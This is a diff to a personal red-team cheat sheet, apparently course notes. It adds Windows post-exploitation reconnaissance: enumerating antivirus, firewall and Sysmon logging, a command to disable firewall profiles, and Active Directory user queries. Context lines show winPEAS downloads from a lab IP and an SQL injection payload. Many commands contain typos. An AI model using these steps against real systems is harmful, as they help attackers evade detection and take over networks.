@@ -9,6 +9,8 @@
     - [John](#john)
     - [Hydra](#hydra)
   - [Phishing](#phishing)
+  - [Lay of the Land](#lay-of-the-land)
+  - [Find AV](#find-av)
   - [Shell](#shell)
     - [Priv Escalation](#priv-escalation)
       - [shared libraries](#shared-libraries)
@@ -58,6 +60,7 @@
     - [evil twin](#evil-twin)
 - [Attack strategies](#attack-strategies)
   - [Active Directory](#active-directory)
+    - [Commands](#commands)
   - [kereberos](#kereberos)
   - [basic post-exploit](#basic-post-exploit)
     - [powerview](#powerview)
@@ -226,7 +229,36 @@
 - Droppers
   - poison, downloaded file
 
+## Lay of the Land
+- Identify segemtns: vlans, dmz, 
+- netstat- na
+  - find open ports
+- arp -a = find neighbors
+- systeminof
+  - part of Active Directory (workgroup / domain)
+  
+- Find AV
+  - wmic
+  - Get-CimInstance
+  - Get-Servive WinDefend
+  - Get-MpComputerStatus
+  - get-Netfirewallprofile
+  - Test-NetConnection 
 
+- Logs
+  - sysmon: logger
+    - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
+    - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
+    - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+    - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+    - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+- IDS, IPDS, Endpoint Detection and Response
+
+
+## Find AV
+- wmic
 
 
 ## Shell
@@ -639,7 +671,34 @@ admin123' UNION SELECT SLEEP(5),2;--
   
 
 # Usefull Windows commands
-- Find file: wmic find users || dir /p datei.txt (find file)
+- Find file: **wmic** find users || dir /p datei.txt (find file)
+- Find AV: wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation)
+  -  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
+  -  Get-Servive WinDefend
+  -  Get-MpComputerStatus
+
+- Firewalls
+  - get-Netfirewallprofile | Format-table
+  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
+  - | select Displayname, Enables, Description
+  - get-netfirewallrulle | select Fields
+  - get-MpThread: findings by Denfender
+
+- Test Connection
+  - Test-NetConnection / TCPClient
+  - Test-NetConnection -ComputerName IP -Port
+
+- get-EventLog -List
+- sysmon: logger
+  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
+  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
+  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+
+- findstr
 - Windows: get file 
 - powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
 - powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"
@@ -706,6 +765,32 @@ admin123' UNION SELECT SLEEP(5),2;--
 # Attack strategies
 
 ## Active Directory
+- Definitions
+  - Domain Controler: provide AD services + control all
+  - Org Units: containers inside AD
+  - Active Directory Objects: user, group, component, printer
+  - AD Domains: collection of components within AD
+  - Forestr: domains trust each other
+
+- Accounts
+  - Builin/Administrator = local admin
+  - Domain Admin: all resources
+  - Entrepreise admin: forest root
+  - schema admin: modify domain/forest
+  - server operator: manage domain server
+  - account operator: manage users
+
+### Commands
+- systeminfo ==> command
+  - Os config + Domain
+  - Domain = AD
+  - Workgroup = local workgroup
+- getAdUser -Filter*
+  - show all ad user account
+  - -Searchbase "CN=Users,DC=THMREDTEAM,DC=COM"
+    - Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"
+
+
 - port 139/445
 - Enum4linux = Enumerate
 - kerbrute = brute force in kerberus active directory
@@ -790,6 +875,7 @@ admin123' UNION SELECT SLEEP(5),2;--
 
 -  using pre installed tools
    -  arp -a => arp neighbour cache
+   -  netstat -an => open ports / connections
    -  /etc/hosts
    -  /etc/resolv.conf
    -  ifconfig - nmcli dev show / ipconfig /all
